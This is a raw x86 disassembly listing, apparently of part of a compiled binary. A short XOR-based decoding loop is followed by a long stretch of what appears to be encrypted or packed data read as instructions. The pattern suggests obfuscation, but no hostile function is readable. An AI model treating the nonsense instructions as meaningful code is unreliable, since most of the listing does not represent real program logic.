  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x63,al
  41049c:	mov    ah,0xf5
  41049e:	ins    BYTE PTR es:[edi],dx
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	out    dx,eax
  4104a8:	mov    al,0xa8
  4104aa:	mov    ds:0xfcfeff93,eax
  4104af:	fisub  DWORD PTR [edx-0x5ea19df7]
  4104b5:	push   eax
  4104b6:	adc    BYTE PTR ds:0xdb38ed25,ch
  4104bc:	in     al,0x33
  4104be:	add    BYTE PTR [ebx],bh
  4104c0:	pop    edi
  4104c1:	or     eax,0xf5c2ca19
  4104c6:	xor    DWORD PTR [ebx+0xf],esp
  4104c9:	ss lahf 
  4104cb:	retf   0x3bd0
  4104ce:	pop    ss
  4104cf:	(bad)  [edx-0x44]
  4104d2:	mul    BYTE PTR [esi-0x22621b43]
  4104d8:	pop    ebp
  4104d9:	imul   ebp,ebx,0xf
  4104dc:	fistp  DWORD PTR [eax]
  4104de:	lea    eax,[edx-0x7]
  4104e1:	bound  ecx,QWORD PTR [esp+edi*8-0x6d757d02]
  4104e8:	inc    esi
  4104e9:	sbb    BYTE PTR [esi+0x3b],cl
  4104ec:	adc    al,0x67
  4104ee:	push   0x241eb044
  4104f3:	jb     0x41054c
  4104f5:	and    eax,0x66b2a197
  4104fa:	push   edx
  4104fb:	mov    ebp,0x3e77a6ba
  410500:	or     BYTE PTR [ebx+0x15f22cef],ah
  410506:	mov    ebp,0xfdda28f6
  41050b:	call   0xb085:0x996ea55d
  410512:	out    0x33,eax
  410514:	sbb    al,0xb6
  410516:	sub    eax,0xcc81cca
  41051b:	ret    
  41051c:	in     al,0x81
  41051e:	mov    bh,0xbd
  410520:	fistp  DWORD PTR [eax-0x42]
  410523:	test   eax,0x3ecd0fc7
  410528:	adc    eax,0x85014a76
  41052d:	push   edi
  41052e:	loope  0x410514
  410530:	push   edi
  410531:	pop    ss
  410532:	mov    ebx,0xb4d7204a
  410537:	xor    BYTE PTR [ebp+0x72],dh
  41053a:	in     al,dx
  41053b:	scas   eax,DWORD PTR es:[edi]
  41053c:	mov    cl,0x23
  41053e:	adc    DWORD PTR [eax-0x2ad503f2],ecx
  410544:	das    
  410545:	jmp    0xdaf8:0x5183aef8
  41054c:	mov    cl,0xe0
  41054e:	nop
  41054f:	pushf  
  410550:	adc    al,0xf2
  410552:	ja     0x410507
  410554:	aad    0x6d
  410556:	jae    0x410562
  410558:	ret    0x3d00
  41055b:	aam    0x23
  41055d:	inc    ebp
  41055e:	mov    bh,0xf
  410560:	cmp    ebx,ebp
  410562:	dec    ebp
  410563:	jo     0x410563
  410565:	out    0x6d,al
  410567:	push   ecx
  410568:	cs ja  0x4105b8
  41056b:	lea    ecx,[ecx+0x32]
  41056e:	hlt    
  41056f:	mov    cl,0x52
  410571:	imul   ebp,DWORD PTR [esi],0x3c5771d
  410577:	jl     0x410515
  410579:	add    ecx,DWORD PTR [esi]
  41057b:	mov    edi,0x412281df
  410580:	push   0x12
  410582:	loopne 0x4105ff
  410584:	fwait
  410585:	popf   
  410586:	jmp    0xe5:0x47f5c407
  41058d:	xor    DWORD PTR [edi],ecx
  41058f:	sti    
  410590:	xchg   edi,eax
  410591:	mov    dh,0x86
  410593:	ret    
  410594:	(bad)
  410599:	iret   
  41059a:	mov    edi,0x24dfec55
  41059f:	cli    
  4105a0:	jmp    0xa161f4a6
  4105a5:	mov    ebp,0x9bebe360
  4105aa:	iret   
  4105ab:	in     al,dx
  4105ac:	cmp    eax,0x7ce4b86b
  4105b1:	pusha  
  4105b2:	call   0x729e:0x9aff6683
  4105b9:	arpl   di,cx
  4105bb:	pop    es
  4105bc:	cmp    dl,BYTE PTR [edx]
  4105be:	push   eax
  4105bf:	jb     0x4105d4
  4105c1:	fnsave [eax]
  4105c3:	dec    ebp
  4105c4:	pushf  
  4105c5:	int3   
  4105c6:	imul   ecx,ebx,0xffffffa8
  4105c9:	stos   DWORD PTR es:[edi],eax
  4105ca:	xor    edx,esi
  4105cc:	fimul  DWORD PTR [ebp+0x38]
  4105cf:	fs (bad) 
  4105d2:	sbb    edx,eax
  4105d4:	adc    BYTE PTR [esi-0x3b5c7002],bh
  4105da:	in     eax,dx
  4105db:	jmp    0x410645
  4105dd:	xchg   ebp,eax
  4105de:	sar    esi,0x84
  4105e1:	shl    DWORD PTR [ebp+0x6f9df314],1
  4105e7:	xor    BYTE PTR [edx+0x14cd38c3],0x85
  4105ee:	mov    bl,0xc9
  4105f0:	outs   dx,BYTE PTR ds:[esi]
  4105f1:	dec    ebx
  4105f2:	jle    0x4105ba
  4105f4:	adc    DWORD PTR [eax+0x67],esi
  4105f7:	jbe    0x410635
  4105f9:	mov    esp,0x8b6d9e13
  4105fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ff:	xor    eax,0x67ca14cb
  410604:	xchg   ebx,eax
  410605:	jbe    0x41064f
  410607:	repz mov cl,0x3c
  41060a:	xchg   esp,eax
  41060b:	pop    eax
  41060c:	jnp    0x410633
  41060e:	stos   BYTE PTR es:[edi],al
  41060f:	pusha  
  410610:	or     DWORD PTR [ecx-0x5d],0xfffffffa
  410614:	jae    0x41060a
  410616:	cmp    esi,DWORD PTR [ebx-0x110950d4]
  41061c:	daa    
  41061d:	sbb    al,0x58
  41061f:	retf   0x676b
  410622:	cwde   
  410623:	popf   
  410624:	or     eax,0x8ac47a58
  410629:	mov    ch,0xfc
  41062b:	mov    ebp,0xb24c0a61
  410630:	dec    edi
  410631:	mov    dl,ah
  410633:	out    dx,eax
  410634:	test   BYTE PTR [esi-0x6754e7a1],bl
  41063a:	dec    ecx
  41063b:	dec    ecx
  41063c:	pop    es
  41063d:	xchg   ecx,eax
  41063e:	pop    esi
  41063f:	sub    al,0x81
  410641:	out    dx,al
  410642:	imul   esi,esi,0xffffffb4
  410645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410646:	les    esi,FWORD PTR [esi+0x6dbf91ce]
  41064c:	cmp    ebx,DWORD PTR ds:0xf68853c0
  410652:	test   DWORD PTR [eax+0x7c],esp
  410655:	ret    
  410656:	aad    0xbb
  410658:	add    ah,0x63
  41065b:	hlt    
  41065c:	mov    ecx,0xb7002d08
  410661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410662:	or     eax,0xbf302b58
  410667:	inc    esi
  410668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410669:	rol    BYTE PTR [edi],1
  41066b:	cmp    esi,DWORD PTR [ebp+0x4]
  41066e:	xchg   ebx,eax
  41066f:	lock mov ecx,0xf2991bd6
  410675:	dec    ecx
  410676:	push   esp
  410677:	add    DWORD PTR [ebx-0x4944ac8d],edi
  41067d:	lods   eax,DWORD PTR ds:[esi]
  41067e:	push   0xc2e4eab4
  410683:	call   0x30f5:0xfa4a9535
  41068a:	add    al,0x35
  41068c:	in     eax,dx
  41068d:	jge    0x410653
  41068f:	aaa    
  410690:	outs   dx,BYTE PTR ds:[esi]
  410691:	aas    
  410692:	push   edx
  410693:	popa   
  410694:	and    ecx,DWORD PTR [ebp-0x5a652be1]
  41069a:	add    DWORD PTR [edx],esp
  41069c:	jnp    0x410708
  41069e:	cmp    bl,BYTE PTR [eax-0x73]
  4106a1:	ret    
  4106a2:	sub    DWORD PTR [esi+edi*8-0x7],ebp
  4106a6:	xchg   esi,eax
  4106a7:	push   es
  4106a8:	retf   0x50ad
  4106ab:	shl    BYTE PTR [ebp-0x2a20294f],0x6c
  4106b2:	mov    edi,fs
  4106b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106b5:	sti    
  4106b6:	adc    BYTE PTR [ecx],dl
  4106b8:	in     al,dx
  4106b9:	cmp    esi,DWORD PTR [eax]
  4106bb:	out    0x7d,al
  4106bd:	fadd   QWORD PTR [ebp+0x7741a70e]
  4106c3:	sbb    BYTE PTR [eax],dl
  4106c5:	mov    ecx,0x3b0e0cc4
  4106ca:	sub    BYTE PTR [esp+ebx*4],dh
  4106cd:	inc    edx
  4106ce:	and    eax,0xbaf38845
  4106d3:	(bad)  
  4106d4:	mov    WORD PTR [ebx],ss
  4106d6:	adc    ebx,esi
  4106d8:	sbb    BYTE PTR [esp+ebx*4],cl
  4106db:	hlt    
  4106dc:	mov    ds:0xe0b42016,eax
  4106e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106e2:	test   al,0xe8
  4106e4:	mov    eax,fs:0x5d46bb07
  4106ea:	mov    ds:0x54b5c99,al
  4106ef:	sbb    esp,DWORD PTR [ecx+esi*1-0x6efbc27c]
  4106f6:	mov    eax,ds:0x302e0940
  4106fb:	ret    
  4106fc:	ins    BYTE PTR es:[edi],dx
  4106fd:	xchg   edi,eax
  4106fe:	jp     0x4106d2
  410700:	adc    bl,dl
  410702:	fucom  st(5)
  410704:	aad    0x3a
  410706:	adc    BYTE PTR [eax+0x1d],cl
  410709:	push   ecx
  41070a:	sbb    edx,DWORD PTR [edi+0x52]
  41070d:	mov    dl,0x65
  41070f:	clc    
  410710:	ds and eax,0xb8bc8537
  410716:	fsub   st,st(0)
  410718:	enter  0xc494,0x1a
  41071c:	jbe    0x4106a0
  41071e:	xlat   BYTE PTR ds:[ebx]
  41071f:	ja     0x4106a7
  410721:	sub    bl,ch
  410723:	sbb    bl,BYTE PTR [edi-0x25]
  410726:	popf   
  410727:	icebp  
  410728:	dec    edi
  410729:	pop    edi
  41072a:	dec    edx
  41072b:	aas    
  41072c:	mov    ecx,0x3b765aa4
  410731:	lock pop edi
  410733:	retf   0xfc4c
  410736:	xlat   BYTE PTR ds:[ebx]
  410737:	jp     0x4106ca
  410739:	sbb    DWORD PTR [edx+0x4b],esi
  41073c:	xchg   ecx,eax
  41073d:	fisttp DWORD PTR [ecx+0x28]
  410740:	cmp    bl,BYTE PTR [ecx+eiz*2]
  410743:	or     al,0xb5
  410745:	ins    BYTE PTR es:[edi],dx
  410746:	mov    bl,0xb5
  410748:	jno    0x41074a
  41074a:	hlt    
  41074b:	pop    edi
  41074c:	xchg   edi,eax
  41074d:	das    
  41074e:	fst    QWORD PTR [eax+0x58489e8f]
  410754:	xchg   edi,eax
  410755:	xchg   BYTE PTR [ebx+0x6b],dl
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xa8d91e70
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410772
  41078c:	mov    esi,0xd00f0696
  410791:	neg    BYTE PTR [ebx]
  410793:	dec    edx
  410794:	stos   BYTE PTR es:[edi],al
  410795:	xor    cl,BYTE PTR [edx+eax*8-0x63013404]
  41079c:	in     al,0xfb
  41079e:	repnz dec ebp
  4107a0:	outs   dx,DWORD PTR ds:[esi]
  4107a1:	shl    DWORD PTR [esi-0x77],1
  4107a4:	shl    BYTE PTR [ecx-0x50d347dc],cl
  4107aa:	(bad)  
  4107ab:	fld    QWORD PTR [esi+ecx*1+0x21dd2197]
  4107b2:	mov    esp,0x81e4bdd7
  4107b7:	rcr    DWORD PTR [ecx-0x28],cl
  4107ba:	enter  0x9eb0,0xed
  4107be:	sbb    edx,DWORD PTR [eax]
  4107c0:	pop    ecx
  4107c1:	cmc    
  4107c2:	pop    ds
  4107c3:	or     BYTE PTR [ecx+0x40c4ffaa],dh
  4107c9:	sub    BYTE PTR [edi+0x11ae868a],0x19
  4107d0:	dec    ecx
  4107d1:	dec    ebp
  4107d2:	xchg   edi,eax
  4107d3:	imul   eax,edx,0x30
  4107d6:	dec    edx
  4107d7:	not    BYTE PTR [edi-0x7e9ff3d5]
  4107dd:	pop    edi
  4107de:	mov    WORD PTR es:[esp],cs
  4107e2:	sbb    ebp,DWORD PTR [esi]
  4107e4:	jmp    0xe74625b0
  4107e9:	cmc    
  4107ea:	jmp    0x7fe9:0xd4da84a0
  4107f1:	inc    ebx
  4107f2:	div    DWORD PTR [eax+0xf]
  4107f5:	(bad)  
  4107f7:	jg     0x4107bd
  4107f9:	test   ecx,edx
  4107fb:	out    dx,eax
  4107fc:	fnsave [ecx+0x76]
  4107ff:	and    al,0x57
  410801:	xchg   edx,eax
  410802:	mov    dh,0x8
  410804:	ret    0x283d
  410807:	leave  
  410808:	fst    st(0)
  41080a:	push   cs
  41080b:	add    al,0xb9
  41080d:	jo     0x4107f9
  41080f:	test   al,bl
  410811:	cmp    BYTE PTR [ecx+0x1d6f9368],cl
  410817:	leave  
  410818:	outs   dx,BYTE PTR ds:[esi]
  410819:	dec    edi
  41081a:	loop   0x410849
  41081c:	fcmovu st,st(4)
  41081e:	sbb    esi,DWORD PTR [edx+ebp*8]
  410821:	ss sti 
  410823:	in     al,0x3c
  410825:	jnp    0x4107e1
  410827:	cmp    BYTE PTR [ebx+ebx*1],bh
  41082a:	mov    edx,0xe8f8933f
  41082f:	les    ebp,FWORD PTR [edx+eax*8]
  410832:	js     0x4108a3
  410834:	mov    dh,0x67
  410836:	aam    0xf2
  410838:	cli    
  410839:	mov    eax,edx
  41083b:	mov    bh,0x6b
  41083d:	jo     0x4107fb
  41083f:	mov    bh,dh
  410841:	inc    ebx
  410842:	or     cl,ch
  410844:	mov    eax,0x5c1e74e9
  410849:	sbb    eax,0x670b70a0
  41084e:	mov    ebp,0x47991100
  410853:	mov    bl,0x0
  410855:	in     al,dx
  410856:	dec    eax
  410857:	mov    al,ds:0x93fbcb20
  41085c:	scas   al,BYTE PTR es:[edi]
  41085d:	xchg   ecx,eax
  41085e:	mov    ch,0xe3
  410860:	fs mov ebp,0xb86e4ebe
  410866:	call   0xcbfd:0x32676121
  41086d:	jmp    0xd1bf:0x46738702
  410874:	mov    edx,0x230ea0ab
  410879:	dec    eax
  41087a:	and    eax,0xbc061ddb
  41087f:	sub    eax,0xf8ff55b
  410884:	call   0x5f8c99d4
  410889:	jae    0x4108cc
  41088b:	xchg   esp,eax
  41088c:	leave  
  41088d:	mov    ecx,0x5816036
  410892:	xchg   esp,eax
  410893:	jno    0x410825
  410895:	cli    
  410896:	test   BYTE PTR [edi+0x12],al
  410899:	dec    esp
  41089a:	mov    bh,0xd2
  41089c:	or     eax,0x605b3299
  4108a1:	mov    cl,0xb3
  4108a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108a4:	dec    ebx
  4108a5:	inc    ebx
  4108a6:	fidiv  DWORD PTR [edi-0x5f]
  4108a9:	cmp    BYTE PTR [ebx-0x3a],cl
  4108ac:	ss push ebp
  4108ae:	cld    
  4108af:	call   0xa414:0xc3b7be1a
  4108b6:	pop    edx
  4108b7:	daa    
  4108b8:	mov    esi,0x879f0c95
  4108bd:	cwde   
  4108be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108bf:	jb     0x410857
  4108c1:	sub    dl,BYTE PTR [edx+ebp*1]
  4108c4:	mov    ds:0x640aed0d,al
  4108c9:	in     eax,0xae
  4108cb:	test   al,0x4e
  4108cd:	or     edi,DWORD PTR [edi+0x7e]
  4108d0:	cdq    
  4108d1:	adc    eax,0xbf11df5e
  4108d6:	cld    
  4108d7:	dec    edi
  4108d8:	xchg   BYTE PTR [ebp+0x7334064b],ah
  4108de:	mov    eax,0xc2f793b5
  4108e3:	and    al,0xc4
  4108e5:	dec    ebx
  4108e6:	pop    edi
  4108e7:	jl     0x410958
  4108e9:	pop    edx
  4108ea:	(bad)  
  4108eb:	and    al,0xb2
  4108ed:	add    DWORD PTR ds:0x8a633f1f,esp
  4108f3:	xchg   ecx,eax
  4108f4:	add    eax,0xa5166eb4
  4108f9:	aaa    
  4108fa:	pop    edx
  4108fb:	ds pop edx
  4108fd:	pop    eax
  4108fe:	fldenv cs:[ecx+esi*2+0x7b]
  410903:	iret   
  410904:	outs   dx,DWORD PTR ds:[esi]
  410905:	pop    es
  410906:	push   ebp
  410907:	loop   0x41089b
  410909:	push   ebx
  41090a:	jg     0x4108b7
  41090c:	ins    DWORD PTR es:[edi],dx
  41090d:	adc    edx,ecx
  41090f:	ins    DWORD PTR es:[edi],dx
  410910:	mov    ds:0x156dfc51,al
  410915:	push   es
  410916:	dec    edx
  410917:	add    eax,0xbbe84d
  41091c:	xor    dl,BYTE PTR [ecx-0x2e56ca5f]
  410922:	jmp    0x410955
  410924:	add    eax,DWORD PTR [ebp-0xf1f758f]
  41092a:	jge    0x410935
  41092c:	repnz call FWORD PTR [edx+0x4f]
  410930:	xor    BYTE PTR [eax],0x8a
  410933:	and    eax,0x1a8f62f8
  410938:	xor    eax,DWORD PTR [eax+0x61]
  41093b:	call   DWORD PTR [ecx+eax*1+0x35]
  41093f:	dec    esi
  410940:	jo     0x4108d1
  410942:	or     BYTE PTR [eax+0x0],bh
  410945:	in     eax,dx
  410946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410947:	dec    ebp
  410948:	add    eax,0xfffffffe
  41094b:	(bad)  
  41094c:	imul   edi,eax,0x7a
  41094f:	int3   
  410950:	or     al,0xed
  410952:	loope  0x4109c1
  410954:	lds    esp,FWORD PTR [ebx-0x5b]
  410957:	shr    DWORD PTR [ecx+edi*1],cl
  41095a:	mov    ds:0x61ae5840,al
  41095f:	in     al,0xb0
  410961:	cli    
  410962:	sub    al,0x13
  410964:	data16 jns 0x4109c4
  410967:	js     0x410928
  410969:	(bad)  
  41096b:	jae    0x4108f5
  41096d:	jno    0x4109e3
  41096f:	(bad)  
  410971:	jns    0x410941
  410973:	jae    0x410934
  410975:	leave  
  410976:	cli    
  410977:	out    dx,al
  410978:	(bad)  
  41097a:	retf   
  41097b:	xchg   edx,eax
  41097c:	cli    
  41097d:	xor    edi,DWORD PTR [ebx-0x67]
  410980:	xor    DWORD PTR [edi],esp
  410982:	mov    WORD PTR [edx+0x1983d8f0],gs
  410988:	jle    0x410956
  41098a:	jg     0x41091c
  41098c:	and    BYTE PTR [eax],cl
  41098e:	mov    al,ds:0xd81c2d37
  410993:	push   0x58bbb2e8
  410998:	mov    fs:0xfa58e24,al
  41099e:	(bad)  
  41099f:	call   0xf348:0x5c9bfd61
  4109a6:	scas   eax,DWORD PTR es:[edi]
  4109a7:	loop   0x41094b
  4109a9:	ret    0xe40b
  4109ac:	inc    ecx
  4109ad:	mov    WORD PTR [eax+0x4314326],fs
  4109b3:	popf   
  4109b4:	jl     0x410a2f
  4109b6:	cmp    al,0xbf
  4109b8:	add    BYTE PTR [edx+edx*4-0x27],0x39
  4109bd:	or     eax,0x4ff0fc1f
  4109c2:	sti    
  4109c3:	mov    esi,DWORD PTR [edi+esi*2+0x6b4e668c]
  4109ca:	imul   BYTE PTR [ebx]
  4109cc:	and    dh,BYTE PTR [eax+edx*8-0x13]
  4109d0:	(bad)  
  4109d1:	and    DWORD PTR [edx-0x50],edx
  4109d4:	sbb    al,0x8f
  4109d6:	les    edi,FWORD PTR [ecx]
  4109d8:	fld    QWORD PTR ds:0x826402e5
  4109de:	sbb    eax,0xca2bd114
  4109e3:	clc    
  4109e4:	out    dx,al
  4109e5:	xchg   ebx,eax
  4109e6:	jmp    0x4109b7
  4109e8:	xchg   DWORD PTR ds:0x4621d265,edi
  4109ee:	jbe    0x410980
  4109f0:	retf   0x3e14
  4109f3:	js     0x410a0a
  4109f5:	push   esp
  4109f6:	ds js  0x410a12
  4109f9:	push   es
  4109fa:	pop    es
  4109fb:	jl     0x4109a6
  4109fd:	icebp  
  4109fe:	inc    ebp
  4109ff:	es xchg esi,eax
  410a01:	inc    ecx
  410a02:	cmc    
  410a03:	pop    ds
  410a04:	ins    BYTE PTR es:[edi],dx
  410a05:	adc    al,0x7
  410a07:	test   DWORD PTR [ebx-0x6610ba27],0x7459f96d
  410a11:	push   esi
  410a12:	mov    dh,0x9a
  410a14:	stos   BYTE PTR es:[edi],al
  410a15:	imul   edi,DWORD PTR [edx-0x7f840948],0x1354b491
  410a1f:	inc    esi
  410a20:	retf   0x76a9
  410a23:	fstp   TBYTE PTR [esi+edx*4+0x29]
  410a27:	mov    al,0x68
  410a29:	pop    es
  410a2a:	pop    edi
  410a2b:	in     al,dx
  410a2c:	lahf   
  410a2d:	ins    BYTE PTR es:[edi],dx
  410a2e:	ss xor eax,0x6f5b523c
  410a34:	popa   
  410a35:	(bad)  
  410a36:	push   ds
  410a37:	sub    BYTE PTR [eax],dh
  410a39:	scas   eax,DWORD PTR es:[edi]
  410a3a:	sub    eax,0xe9c603c8
  410a3f:	leave  
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	pop    eax
  410a50:	mov    eax,0xbdba3138
  410a55:	jle    0x410ad5
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410ad6
  410a5c:	sub    eax,0xda200877
  410a61:	dec    bp
  410a63:	test   al,0x6c
  410a65:	loope  0x410a9b
  410a67:	shl    DWORD PTR [edx],0xe4
  410a6a:	cdq    
  410a6b:	inc    ecx
  410a6c:	retf   0xe785
  410a6f:	not    eax
  410a71:	sti    
  410a72:	jmp    0x61a8b89f
  410a77:	rcr    esp,cl
  410a79:	and    eax,0x97c3e2b3
  410a7e:	mov    cl,0x15
  410a80:	pop    esp
  410a81:	pop    edx
  410a82:	pop    esi
  410a83:	popa   
  410a84:	dec    edx
  410a85:	xor    BYTE PTR [edi],dh
  410a87:	out    0x44,eax
  410a89:	leave  
  410a8a:	popf   
  410a8b:	add    bh,dh
  410a8d:	out    dx,eax
  410a8e:	pop    ds
  410a8f:	or     esp,esp
  410a91:	mov    ebx,0xe597464a
  410a96:	sub    bh,BYTE PTR [edi-0x7d]
  410a99:	fimul  WORD PTR [edi]
  410a9b:	xchg   ebp,eax
  410a9c:	inc    ecx
  410a9d:	ds inc ecx
  410a9f:	das    
  410aa0:	jmp    0xb46f:0x62106a67
  410aa7:	icebp  
  410aa8:	pop    ss
  410aa9:	fidiv  WORD PTR ds:0xb373dc0a
  410aaf:	int    0x39
  410ab1:	add    BYTE PTR ds:0x6ea225d5,al
  410ab7:	xchg   esp,eax
  410ab8:	jl     0x410acf
  410aba:	mov    eax,ds:0x4c7d19ef
  410abf:	pop    esi
  410ac0:	mov    al,0xd2
  410ac2:	sub    DWORD PTR [edx+0x3e],ebx
  410ac5:	sub    DWORD PTR [esp+esi*4],edi
  410ac8:	into   
  410ac9:	lock jge 0x410a91
  410acc:	lea    edi,ds:0xe7576097
  410ad2:	std    
  410ad3:	jb     0x410b42
  410ad5:	mov    ds:0x9ac275f4,al
  410ada:	jecxz  0x410a6c
  410adc:	test   BYTE PTR [esi],al
  410ade:	cs or  ecx,edx
  410ae1:	mov    edx,0xe455301e
  410ae6:	adc    al,0xc
  410ae8:	mov    dl,0x4d
  410aea:	pop    edx
  410aeb:	bnd jmp 0x24c0f075
  410af1:	pusha  
  410af2:	mov    eax,0xe1842763
  410af7:	push   edx
  410af8:	cmp    BYTE PTR [edi],dh
  410afa:	xchg   ebx,eax
  410afb:	imul   edi,eax,0xffffffa4
  410afe:	sbb    bl,BYTE PTR [ecx+0x2c]
  410b01:	sub    edi,ecx
  410b03:	push   ebx
  410b04:	cld    
  410b05:	ins    BYTE PTR es:[edi],dx
  410b06:	pop    dx
  410b08:	(bad)  
  410b09:	fstp   TBYTE PTR [edx]
  410b0b:	pusha  
  410b0c:	jmp    0xcd8d:0xb0acdcae
  410b13:	cld    
  410b14:	or     ch,BYTE PTR fs:[ebx-0x688576d0]
  410b1b:	xchg   BYTE PTR [edi+0x5b1fbd1a],al
  410b21:	xchg   ecx,eax
  410b22:	add    ecx,DWORD PTR [esi+ecx*4-0x68f94f92]
  410b29:	jbe    0x410aec
  410b2b:	ss push cs
  410b2d:	(bad)  [ecx+0x48a4a4d1]
  410b33:	push   edx
  410b34:	sub    ah,BYTE PTR [ebx-0x4319d215]
  410b3a:	daa    
  410b3b:	and    edi,DWORD PTR [ebp+0x25]
  410b3e:	cmp    DWORD PTR [eax-0x5f2e4b06],eax
  410b44:	data16 mov al,0x58
  410b47:	xchg   ebp,eax
  410b48:	xor    al,0x20
  410b4a:	push   0xffffffec
  410b4c:	or     cl,BYTE PTR [esi+0x7cb82d62]
  410b52:	mov    esp,0xd29e53a3
  410b57:	sbb    al,BYTE PTR gs:[ebx]
  410b5a:	cmp    eax,0x7198378b
  410b5f:	dec    esp
  410b60:	out    0x1,al
  410b62:	sbb    dl,ah
  410b64:	and    ah,al
  410b66:	sub    al,BYTE PTR [ebx-0x6a]
  410b69:	mov    ah,0x2d
  410b6b:	inc    ebp
  410b6c:	fwait
  410b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b6e:	mov    ds:0xaadb5ab9,eax
  410b73:	xor    eax,ebx
  410b75:	jecxz  0x410b7f
  410b77:	ins    BYTE PTR es:[edi],dx
  410b78:	push   ss
  410b79:	dec    eax
  410b7a:	test   eax,0xcac9677f
  410b7f:	push   cs
  410b80:	xor    DWORD PTR [eax+0x18],ecx
  410b83:	js     0x410b47
  410b85:	mov    bh,0xee
  410b87:	adc    eax,0x22e40d79
  410b8c:	or     eax,0x9d2ff2c5
  410b91:	sar    BYTE PTR [ecx+0x62a5537f],cl
  410b97:	jne    0x410bd0
  410b99:	xchg   DWORD PTR [edi-0x5ff3ac63],ebx
  410b9f:	mov    ebp,0xcc3a7671
  410ba4:	mov    bh,0x59
  410ba6:	xchg   edx,eax
  410ba7:	mov    DWORD PTR [edx-0x428ed747],ebx
  410bad:	aas    
  410bae:	pop    ecx
  410baf:	dec    edi
  410bb0:	mov    dh,0x59
  410bb2:	push   ebp
  410bb3:	adc    BYTE PTR [esi],0x15
  410bb6:	(bad)  
  410bb8:	jmp    0xe136:0x6b1ffa89
  410bbf:	outs   dx,BYTE PTR ds:[esi]
  410bc0:	jnp    0x410b9a
  410bc2:	je     0x410c13
  410bc4:	cmp    eax,DWORD PTR [esp+ecx*4+0x8]
  410bc8:	mov    ds,WORD PTR [eax]
  410bca:	mov    ebx,0xa884e00a
  410bcf:	in     eax,dx
  410bd0:	daa    
  410bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd2:	xchg   edi,eax
  410bd3:	sbb    al,0xea
  410bd5:	call   0x5dcb:0x9b898428
  410bdc:	mov    eax,0x9ba546a0
  410be1:	bound  esp,QWORD PTR [ebx-0x499ae675]
  410be7:	dec    ecx
  410be8:	mov    ch,BYTE PTR [eax+eax*8-0x5d]
  410bec:	jle    0x410ba2
  410bee:	sub    DWORD PTR [ebx+0x56],esi
  410bf1:	jp     0x410b77
  410bf3:	jg     0x410c3e
  410bf5:	xor    ecx,DWORD PTR [edi+0x5ede142c]
  410bfb:	lods   eax,DWORD PTR ds:[esi]
  410bfc:	lahf   
  410bfd:	mov    ch,0x45
  410bff:	push   0x598d447b
  410c04:	pop    ss
  410c05:	out    0x9,al
  410c07:	out    dx,eax
  410c08:	push   edi
  410c09:	fwait
  410c0a:	icebp  
  410c0b:	mov    ds:0x7f34caaf,eax
  410c10:	ds mov edi,0x1d62af81
  410c16:	mov    esi,0x2cf723e4
  410c1b:	jecxz  0x410bba
  410c1d:	arpl   WORD PTR ds:0xe2832dfb,bp
  410c23:	jmp    0x410c96
  410c25:	xchg   esp,eax
  410c26:	push   esp
  410c27:	jmp    0x410c83
  410c29:	jecxz  0x410bb7
  410c2b:	add    BYTE PTR [eax+ecx*8-0x6f2778e7],bh
  410c32:	call   0xadcb:0xecd9e34b
  410c39:	jnp    0x410c0a
  410c3b:	pop    eax
  410c3c:	cmc    
  410c3d:	mov    edx,0x19da7683
  410c42:	int3   
  410c43:	mov    ch,0x38
  410c45:	bound  esp,QWORD PTR [ebx+0x7c31ea44]
  410c4b:	test   al,0x30
  410c4d:	addr16 (bad) 
  410c4f:	aas    
  410c50:	fisttp DWORD PTR [edi+0x3cd27443]
  410c56:	pop    ebx
  410c57:	les    edi,FWORD PTR [ecx]
  410c59:	xchg   DWORD PTR [eax],ecx
  410c5b:	jmp    0x1ad9ac9f
  410c60:	(bad)  ds:0xb85dc3aa
  410c66:	inc    esp
  410c67:	fnstsw WORD PTR [esi-0x225b95e]
  410c6d:	push   ebx
  410c6e:	ret    0x380d
  410c71:	aad    0x7e
  410c73:	fist   WORD PTR [edx-0x3c]
  410c76:	int    0xc
  410c78:	cld    
  410c79:	xchg   esp,eax
  410c7a:	jp     0x410ceb
  410c7c:	imul   eax,DWORD PTR [esi-0x24],0x8eb0b06d
  410c83:	int    0x7e
  410c85:	fild   WORD PTR [esi]
  410c87:	sar    al,1
  410c89:	mov    cl,0xb4
  410c8b:	aaa    
